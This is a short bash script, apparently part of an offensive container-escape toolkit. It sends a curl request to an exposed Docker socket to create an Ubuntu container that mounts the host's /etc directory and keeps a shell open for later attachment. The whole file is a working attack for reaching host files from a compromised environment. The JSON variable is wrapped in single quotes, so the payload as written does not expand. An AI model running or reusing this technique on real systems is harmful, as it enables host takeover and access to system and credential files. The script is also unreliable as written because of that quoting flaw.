#!/bin/bash
# How to use this script:
# Either replace CONTAINER_JSON with a file on the system or set it as an evn var if executing the command from the shell rather than a file.
# Set $DOCKER_SOCK_PATH to the path of the docker socket (use fingerprinting/find_docker_sock.sh) if it is available using and env var or by modifying the command.
# If all when well you'll get back a JSON response with an Id in it. Copy that into your notes! You'll need it to attach to the container you just created.
CONTAINER_JSON='{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}'
curl -s -XPOST -H 'Content-Type: application/json' --unix-socket $DOCKER_SOCK_PATH -d '$CONTAINER_JSON' http://localhost/containers/create
